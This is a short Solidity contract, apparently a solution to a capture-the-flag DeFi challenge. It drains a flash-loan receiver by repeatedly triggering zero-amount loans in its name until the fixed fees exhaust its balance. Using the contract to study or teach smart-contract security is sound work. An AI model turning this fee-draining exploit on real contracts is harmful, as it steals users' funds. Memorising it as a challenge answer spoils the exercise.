// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";


contract Attacker{

    function attack(NaiveReceiverLenderPool pool, address borrower) public returns(uint256 balance) {
        while(address(borrower).balance >= pool.fixedFee()) {
            pool.flashLoan(borrower,0);
        }

        return borrower.balance;
    }
}